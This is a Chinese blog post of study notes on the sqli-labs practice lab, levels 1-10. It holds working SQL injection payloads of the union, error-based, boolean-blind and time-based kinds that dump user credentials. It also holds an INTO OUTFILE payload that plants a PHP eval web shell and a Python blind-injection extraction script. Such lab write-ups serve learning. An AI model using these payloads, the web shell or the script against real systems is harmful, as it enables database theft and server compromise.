<!-- build time:Thu Apr 02 2020 15:46:39 GMT+0800 (中国标准时间) --><!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>sqli-labs学习笔记Less1~10 | CapybaraJ&#39;s Blog~</title><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="description" content="sqli-labs,一个很好的学习sql的集锦网站，try"><meta name="keywords" content="sql"><meta property="og:type" content="article"><meta property="og:title" content="sqli-labs学习笔记Less1~10"><meta property="og:url" content="https://fatheadrat.tk/2019/10/03/sqli-labs-study-1/index.html"><meta property="og:site_name" content="CapybaraJ&#39;s Blog~"><meta property="og:description" content="sqli-labs,一个很好的学习sql的集锦网站，try"><meta property="og:locale" content="default"><meta property="og:image" content="https://i.loli.net/2019/10/09/tZVuJj3qTHShlGx.jpg"><meta property="og:image" content="https://i.loli.net/2019/10/09/1PYAgrDovnJVLj9.jpg"><meta property="og:image" content="https://i.loli.net/2019/10/09/cIFkxH3BzEGebsP.png"><meta property="og:image" content="https://i.loli.net/2019/10/09/TGwyCMBUEi9WFoR.png"><meta property="og:image" content="https://i.loli.net/2019/10/09/PGCRjn2dHW8gQx9.jpg"><meta property="og:image" content="https://i.loli.net/2019/10/09/jN53vbt6fV2gXyU.png"><meta property="og:updated_time" content="2019-10-23T11:51:07.558Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="sqli-labs学习笔记Less1~10"><meta name="twitter:description" content="sqli-labs,一个很好的学习sql的集锦网站，try"><meta name="twitter:image" content="https://i.loli.net/2019/10/09/tZVuJj3qTHShlGx.jpg"><link rel="alternative" href="/atom.xml" title="CapybaraJ&#39;s Blog~" type="application/atom+xml"><link rel="icon" href="/img/favicon.ico"><link rel="stylesheet" href="/css/style.css"><link herf="//fonts.googleapis.com/css?family=Source+Code+Pro&display=swap" rel="stylesheet" type="text/css"><!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]--><script type="text/javascript">var isWX=/micromessenger/i.test(navigator.userAgent);isWX&&(document.write('<br/><br/><h1 style="text-align: center;font-size:32px;" >╮(╯_╰)╭</h1><br/><br/><h4 style="text-align: center;" >请在浏览器中打开。</h4><br/><h4 style="text-align: center;" >Please open in the browser.</h4>'),window.stop?window.stop():document.execCommand("Stop"))</script></head></html><body><div id="container"><div id="wrap"><header id="header"><div id="banner"></div><div id="header-outer" class="outer"><nav id="upper-nav" class="inner"><a id="main-nav-toggle" class="nav-icon"></a><div class="sub-nav"><a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a> <a id="nav-github" class="nav-icon" href="https://github.com/capybaraj"></a></div></nav><div id="header-title"><h1 id="blog-title-wrap"><a href="/" id="blog-title">CapybaraJ&#39;s Blog~</a></h1></div><div id="contenedor"><ul class="cube"><li class="cara"><img src="/img/cube/health.png" style="height:50%;width:50%;opacity:.8"></li><li class="cara"><img src="/img/cube/money.png" style="height:50%;width:50%;opacity:.8"></li><li class="cara"><img src="/img/cube/time.png" style="height:50%;width:50%;opacity:.8"></li><li class="cara"><img src="/img/cube/know.png" style="height:50%;width:50%;opacity:.8"></li><li class="cara"><img src="/img/cube/love.png" style="height:50%;width:50%;opacity:.8"></li><li class="cara"><img src="/img/cube/kind.png" style="height:50%;width:50%;opacity:.8"></li></ul></div><nav id="main-nav"><a class="main-nav-link" href="/">Home</a> <a class="main-nav-link" href="/archives">Archives</a> <a class="main-nav-link" href="/about">About</a> <a class="main-nav-link st-search-show-outputs">Search</a></nav></div></header><div class="outer"><section id="main"><article id="post-sqli-labs-study-1" class="article article-type-post" itemscope itemprop="blogPost"><div class="article-meta"><h3 href="/2019/10/03/sqli-labs-study-1/" class="article-date"><time datetime="2019-10-03T10:09:12.000Z" itemprop="datePublished">2019-10-03</time></h3><div class="article-category"><a class="article-category-link" href="/categories/WEB/">WEB</a></div></div><div class="article-inner"><div class="curve-down"><div class="fill-content"><header class="article-header"><h1 class="article-title" itemprop="name">sqli-labs学习笔记Less1~10</h1></header><div class="article-entry" itemprop="articleBody"><div id="toc" class="toc-article"><strong class="toc-title">Contents</strong><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#安装"><span class="toc-text">安装</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less1-4：union元数据"><span class="toc-text">Less1~4：union元数据</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less5-6：报错"><span class="toc-text">Less5~6：报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less7：oufile-infile"><span class="toc-text">Less7：oufile/infile</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less8：boolian"><span class="toc-text">Less8：boolian</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less9-10-Time-based"><span class="toc-text">Less9~10: Time based</span></a></li></ol></div><p>sqli-labs,一个很好的学习sql的集锦网站，try</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><a href="https://blog.51cto.com/2042617/2338798" target="_blank" rel="noopener">https://blog.51cto.com/2042617/2338798</a></p><p>直接开始吧！</p><p>我装在docker里面，直接： <code>docker run -dt --name sqli-lab -p 80:80 --rm xxx</code></p><h2 id="Less1-4：union元数据"><a href="#Less1-4：union元数据" class="headerlink" title="Less1~4：union元数据"></a>Less1~4：union元数据</h2><p>比较普通的union查询注入，也没有什么waf，主要是闭合方式的不同</p><hr><p><strong>less1</strong></p><p>1’+order+by+3–+</p><p>1’+order+by+4–+</p><p>o’+union+select+1,@@version,3–+（用+代替空格，单纯–不行，用%23，也就是#的编码也可以）</p><p>o’+union+select+1,group_concat(schema_name),;%23</p><p>o’+union+select+1,2,group_concat(table_name)+from+information_schema.tables+where+table_schema=’security’%23</p><p>o’+union+select+1,2,group_concat(column_name)+from+information_schema.columns+where+table_name=’users’%23</p><p>o’+union+select+1,2,group_concat(concat_ws(“:”,id,username,password))from+security.users%23</p><hr><p><strong>less2</strong></p><p>基本无变化，同less1；数字型的</p><hr><p><strong>less3</strong></p><p>字符型注入,而且是以 (‘’)的方式闭合字符串的</p><p>999’)+union+select+1,group_concat(schema_name),3+from+information_schema.schemata%23</p><hr><p><strong>less4</strong></p><p><img src="https://i.loli.net/2019/10/09/tZVuJj3qTHShlGx.jpg" alt="观察闭合方式"></p><p>999”)+union+select+1,group_concat(schema_name),3+from+information_schema.schemata%23</p><hr><h2 id="Less5-6：报错"><a href="#Less5-6：报错" class="headerlink" title="Less5~6：报错"></a>Less5~6：报错</h2><p><strong>报错注入</strong></p><blockquote><p>count()+floor()+rand()报错注入</p></blockquote><p>参考：<a href="https://blog.csdn.net/cried_cat/article/details/80022378" target="_blank" rel="noopener">floor()函数报错分析</a></p><p>写得非常好，总结来说，就是与floor(rand(0)*2)拼接的字段作为group by的字段，导致插入键值key在虚表里插入产生冲突；从而导致错误</p><p>因此表最好是有三条数据以上这样才能保证产生冲突；</p><p>深入原理看参考</p><blockquote><p>updatexml(XML_document, XPath_string, new_value);</p></blockquote><p>xml文档更新</p><p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。<br>第三个参数：new_value，String格式，替换查找到的符合条件的数据<br>操纵第二个参数出错即可；比如<code>updatexml(1,concat(0x7e,(version())),0)</code>加一个<code>0x7e</code>(也就是~)导致解析出错</p><blockquote><p>extractvalue(XML_document，XPath_string)</p></blockquote><p>对XML文档进行查询的函数，基本同上</p><hr><p><strong>less5</strong></p><img src="https://i.loli.net/2019/10/09/1PYAgrDovnJVLj9.jpg" alt="关注闭合方式" style="zoom:50%"> <img src="https://i.loli.net/2019/10/09/cIFkxH3BzEGebsP.png" alt="and 1=1#" style="zoom:50%"> <img src="https://i.loli.net/2019/10/09/TGwyCMBUEi9WFoR.png" alt="and 1=2#" style="zoom:100%"><p>无回显，报错注入</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- floor报错</span></span><br><span class="line">and (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">"|"</span>,(<span class="keyword">select</span>(<span class="keyword">select</span>(payload写这里！！))<span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)x)</span><br><span class="line"><span class="comment">-- 这个payload没有分隔符，小心点</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span>(<span class="keyword">select</span>(payload写这里！！))<span class="keyword">from</span> information_schema.tables <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 这个payload不行</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="string">":"</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>))<span class="keyword">from</span> security.users</span><br><span class="line"><span class="comment">-- 这个可以</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">concat</span>(username,<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">distinct</span> <span class="keyword">concat_ws</span>(<span class="string">":"</span>,username,<span class="keyword">password</span>) <span class="keyword">from</span> security.users <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 爆版本，最简单的，可以用来测试</span></span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat_ws</span>(<span class="string">","</span>,<span class="keyword">version</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)x)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 以下两种：输出字符有长度限制，最长32位。</span></span><br><span class="line"><span class="comment">-- updatexml</span></span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>, @@<span class="keyword">version</span>),<span class="number">0</span>)<span class="comment">--+</span></span><br><span class="line"><span class="keyword">and</span>+updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="string">":"</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>))+<span class="keyword">from</span>+security.users)),<span class="number">0</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--extravalue()</span></span><br><span class="line"><span class="keyword">and</span>+extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span>+<span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(<span class="string">":"</span>,<span class="keyword">id</span>,username,<span class="keyword">password</span>))+<span class="keyword">from</span>+security.users)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><hr><p><strong>less6</strong></p><p>和5差不多，只需要将?id=2’ 改为 ?id=2”即可</p><hr><h2 id="Less7：oufile-infile"><a href="#Less7：oufile-infile" class="headerlink" title="Less7：oufile/infile"></a>Less7：oufile/infile</h2><hr><p><strong>less7</strong></p><p>屏蔽了报错，出错就只返回SQL syntax</p><p>尝试是双括号闭合；尝试union select 1,2,3发现数据要三列</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span><span class="string">'))+union+select+1,2,"&lt;?php+@eval($_GET['</span>haha<span class="string">']);+?&gt;"+into+outfile+'</span>/<span class="keyword">var</span>/www/html/haha3.php<span class="string">';--+</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/09/PGCRjn2dHW8gQx9.jpg" alt="phpinfo()"></p><p>但是哦，这个要写权限，不然出错了，出错如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select 1,2,3 into outfile <span class="string">'/var/www/html/Less-1/haha.php'</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">'t create/write to file '</span>/var/www/html/Less-1/haha.php<span class="string">' (Errcode: 13)</span></span><br></pre></td></tr></table></figure><hr><h2 id="Less8：boolian"><a href="#Less8：boolian" class="headerlink" title="Less8：boolian"></a>Less8：boolian</h2><p><strong>Less8</strong></p><p>就是闭合不一样，<code>id=4&#39;--+</code></p><p>出错没有反应；不出错返回”You are in…….”，本关说让你考虑下布尔注入。</p><p>sql基于布尔的盲注</p><p><img src="https://i.loli.net/2019/10/09/jN53vbt6fV2gXyU.png" alt="sql基于布尔的注入"></p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url=<span class="string">"http://sqli-labs/Less-8/"</span></span><br><span class="line">id = <span class="string">"id="</span></span><br><span class="line">detect = <span class="string">"You are in..........."</span></span><br><span class="line"><span class="string">'''POC'''</span></span><br><span class="line">poc_database = <span class="string">"select group_concat(schema_name) from information_schema.schemata limit 0,1"</span></span><br><span class="line">poc_table = <span class="string">"select group_concat(table_name) from information_schema.tables where table_schema like 'security' limit 0,1"</span></span><br><span class="line">poc_column = <span class="string">"select group_concat(column_name) from information_schema.columns where table_name like 'users' and table_schema like 'security' limit 0,1"</span></span><br><span class="line">poc_data = <span class="string">"select group_concat(concat_ws('-',id,username,password)) from security.users where id &gt; 0 limit 0,1"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">toChar</span><span class="params">(results)</span>:</span></span><br><span class="line">    final = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(results)):</span><br><span class="line">        final += chr(results[i])</span><br><span class="line">    <span class="keyword">print</span> (final)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">judge</span><span class="params">(sstr, l,r)</span>:</span></span><br><span class="line">    mjudge = int((l+r)/<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> (mjudge == l):</span><br><span class="line">        <span class="keyword">return</span> l</span><br><span class="line">    lparam = sstr</span><br><span class="line">    rparam = sstr</span><br><span class="line">    lparam = lparam.replace(<span class="string">"&lt;[symbol]&gt;"</span>, <span class="string">"&lt;"</span>)  <span class="comment">#</span></span><br><span class="line">    lparam = lparam.replace(<span class="string">"&lt;[jid]&gt;"</span>, str(mjudge))  <span class="comment">#</span></span><br><span class="line">    rparam = rparam.replace(<span class="string">"&lt;[symbol]&gt;"</span>,<span class="string">"&gt;="</span>)  <span class="comment">#</span></span><br><span class="line">    rparam = rparam.replace(<span class="string">"&lt;[jid]&gt;"</span>,str(mjudge))  <span class="comment">#</span></span><br><span class="line">    <span class="comment"># print (lparam,rparam)</span></span><br><span class="line">    lrsp = requests.get(url, params = lparam)</span><br><span class="line">    rrsp = requests.get(url, params = rparam)</span><br><span class="line">    <span class="comment"># print (lrsp.text.find(detect),rrsp.text.find(detect))</span></span><br><span class="line">    <span class="keyword">if</span> (lrsp.text.find(detect) &gt;= <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> judge(sstr,l,mjudge)</span><br><span class="line">    <span class="keyword">if</span> (rrsp.text.find(detect) &gt;= <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> judge(sstr,mjudge,r)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Wrong Occur: "</span>+str(l)+<span class="string">","</span>+str(r))</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(poc)</span>:</span></span><br><span class="line">    flag = int(<span class="number">1e6</span>)</span><br><span class="line">    lx = <span class="number">0</span></span><br><span class="line">    results =[]</span><br><span class="line">    <span class="keyword">while</span> flag:</span><br><span class="line">        lx += <span class="number">1</span></span><br><span class="line">        flag -= <span class="number">1</span></span><br><span class="line">        right = id + <span class="string">"1' and ascii(substr((&#123;&#125;),&#123;&#125;,1))&gt;0;%23"</span>.format(poc_database,lx)</span><br><span class="line">        response = requests.get(url, params=right)</span><br><span class="line">        <span class="keyword">if</span> ((response.text).find(detect) &lt; <span class="number">0</span>):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        sstr = id + <span class="string">"1' and ascii(substr((&#123;poc&#125;),&#123;lx&#125;,1))&lt;[symbol]&gt;&lt;[jid]&gt;;%23"</span>.format(poc=poc, lx=lx)</span><br><span class="line">        result = judge(sstr,<span class="number">1</span>,<span class="number">128</span>)</span><br><span class="line">        <span class="keyword">print</span> (chr(result), end=<span class="string">''</span>)</span><br><span class="line">        results.append(int(result))</span><br><span class="line"></span><br><span class="line">getData(poc_data)</span><br></pre></td></tr></table></figure><hr><h2 id="Less9-10-Time-based"><a href="#Less9-10-Time-based" class="headerlink" title="Less9~10: Time based"></a>Less9~10: Time based</h2><p><strong>Less9</strong></p><p>不管我输啥，页面返回都是一样的，我就不能用布尔注入了，没有对比</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1%27+and+sleep(0);%23</span><br><span class="line">id=1%27+and+sleep(4);%23</span><br><span class="line">两句话看出了差距</span><br></pre></td></tr></table></figure><p>时间注入，注意语句，把Less8的脚本改造一下就能用了，语句改成<code>1&#39; and if(ascii(substr(({POC}),{lx},1))&lt;[SYMBOL]&gt;&lt;[JID]&gt;,sleep({SLEEP_TIME}),1);%23</code></p><p>原理很简单，就是，慢…….的………要……..死………</p><p><strong>Less10</strong></p><p>变双引号就行</p><p><code>1&quot; and if(ascii(substr(({POC}),{lx},1))&lt;[SYMBOL]&gt;&lt;[JID]&gt;,sleep({SLEEP_TIME}),1);%23</code></p><p>当然除了sleep也可以用<code>(select benchmark(10000000,md5(0x41)))</code></p><div class="article-copyright"><hr>本文作者: &nbsp;CapybaraJ<br>本文链接: &nbsp;<a herf="#">https://fatheadrat.tk/2019/10/03/sqli-labs-study-1/</a><br>版权声明: &nbsp;除非注明，本博文章均为原创，转载请以链接形式标明本文地址<br></div></div><footer class="article-footer"><div class="article-footer-content"><h3 href="/2019/10/03/sqli-labs-study-1/" class="article-updated">Updated&nbsp;:&nbsp;<time datetime="2019-10-23T11:51:07.558Z" itemprop="datePublished">2019-10-23</time></h3><ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql/">sql</a></li></ul><a data-url="https://fatheadrat.tk/2019/10/03/sqli-labs-study-1/" data-id="ck8iggyhe0022fv2ojeg7qzm0" class="article-share-link">Share</a> <a href="https://fatheadrat.tk/2019/10/03/sqli-labs-study-1/#utterances" class="article-comment-link">Comments</a> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv" class="article-count-link"></span></span></div></footer></div></div></div><nav id="article-nav"><a href="/2019/10/06/sqli-labs-study-2/" id="article-nav-newer" class="article-nav-link-wrap"><strong class="article-nav-caption">Newer</strong><div class="article-nav-title">sqli-labs学习笔记Less11~20</div></a><a href="/2019/09/24/sm-ms/" id="article-nav-older" class="article-nav-link-wrap"><strong class="article-nav-caption">Older</strong><div class="article-nav-title">sm.ms图床测试及脚本测试</div></a></nav><div class="article-inner"><div class="fill-content"><section id="comments"><script src="https://utteranc.es/client.js" repo="CapybaraJ/capybaraj.github.io" issue-term="pathname" theme="github-light" crossorigin="anonymous" async></script></section></div></div></article></section><aside id="sidebar"><div class="widget-wrap"><h3 class="widget-title">Tag Cloud</h3><div class="widget tagcloud"><a href="/tags/SmartContract/" style="font-size:10px">SmartContract</a> <a href="/tags/ctf/" style="font-size:10px">ctf</a> <a href="/tags/docker/" style="font-size:10px">docker</a> <a href="/tags/ethereum/" style="font-size:17.5px">ethereum</a> <a href="/tags/geth/" style="font-size:12.5px">geth</a> <a href="/tags/git/" style="font-size:10px">git</a> <a href="/tags/github/" style="font-size:10px">github</a> <a href="/tags/go/" style="font-size:10px">go</a> <a href="/tags/hexo/" style="font-size:20px">hexo</a> <a href="/tags/iTerm/" style="font-size:10px">iTerm</a> <a href="/tags/markdown/" style="font-size:10px">markdown</a> <a href="/tags/php/" style="font-size:10px">php</a> <a href="/tags/py-evm/" style="font-size:15px">py-evm</a> <a href="/tags/remix/" style="font-size:10px">remix</a> <a href="/tags/sql/" style="font-size:12.5px">sql</a> <a href="/tags/zsh/" style="font-size:10px">zsh</a></div></div><div class="widget-wrap"><h3 class="widget-title">Categories</h3><div class="widget"><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/BlockChain/">BlockChain</a><span class="category-list-count">9</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/Programming/">Programming</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB/">WEB</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/分享/">分享</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/前端/">前端</a><span class="category-list-count">5</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/工具指导/">工具指导</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/读书笔记/">读书笔记</a><span class="category-list-count">1</span></li></ul></div></div><div class="widget-wrap"><h3 class="widget-title">Archives</h3><div class="widget"><ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">10</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">July 2018</a><span class="archive-list-count">1</span></li></ul></div></div><div class="widget-wrap"><h3 class="widget-title">Links</h3><div class="link-lists widget"><ul><li><a href="https://www.sun11.me/blog/2016/hexo-theme-paperbox/" target="_blank">Paperbox</a></li><li><a href="https://paper.seebug.org/" target="_blank">Paper</a></li></ul></div></div></aside></div><footer id="footer"><div class="outer"><div id="footer-info" class="inner">&copy; 2018~2020 CapybaraJ&nbsp;<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span class="post-meta-divider">|</span> <span id="busuanzi_container_site_pv">Views&nbsp;<span id="busuanzi_value_site_pv"></span></span> <span class="post-meta-divider">|</span> <span id="busuanzi_container_site_uv">Visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span><br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> . Theme by <a href="https://github.com/sun11/hexo-theme-paperbox" target="_blank">Paperbox</a></div></div></footer></div><nav id="mobile-nav"><a href="/" class="mobile-nav-link">Home</a> <a href="/archives" class="mobile-nav-link">Archives</a> <a href="/about" class="mobile-nav-link">About</a> <a href="#search" class="mobile-nav-link st-search-show-outputs">Search</a></nav><div id="totop"><a title="To Top"></a></div><script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script><script src="//cdnjs.cloudflare.com/ajax/libs/lrsjng.jquery-qrcode/0.12.0/jquery.qrcode.min.js"></script><link rel="stylesheet" href="/fancybox/jquery.fancybox.css"><script src="/fancybox/jquery.fancybox.pack.js"></script><script src="/js/script.js"></script></div></body><!-- rebuild by neat -->